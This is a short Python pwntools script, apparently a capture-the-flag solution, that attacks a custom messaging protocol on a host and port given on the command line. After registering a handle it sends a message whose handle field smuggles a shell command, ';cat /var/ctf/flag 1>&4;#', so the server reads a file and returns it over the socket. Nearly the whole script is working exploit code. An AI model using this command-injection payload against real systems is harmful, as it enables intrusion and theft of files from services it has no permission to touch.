#!/usr/bin/python
from pwn import *
import sys
"""
inital_send : \x00\x6a\x65\x90 \x01 \x07 \x68\x65\x78\x69\x77\x65\x31   .je...hexife1
              seqNum        CLI_INIT HandleLen   handle

inital_recv : \x1d\x00\x00\x00\x02  .....
              ???              msg = 2 = ok 
                                   = 3 = alreay use handle
                                   = other = Nop

"""
context.log_level = 'ERROR'

conn = remote(sys.argv[1],int(sys.argv[2]))

conn.send('\x00\x6a\x65\x90\x01\x07'+'hexife2')

data = conn.recv()

assert data[1:5] == '\x00\x00\x00\x02'

conn.send('\x00\x6a\x65\x91\x0c') # try to enable log

conn.send('\x00\x6a\x65\x92\x05\x07hexife3\x07hexife2i";cat /var/ctf/flag 1>&4;#"')

data = conn.recv()

sys.stdout.write(data)


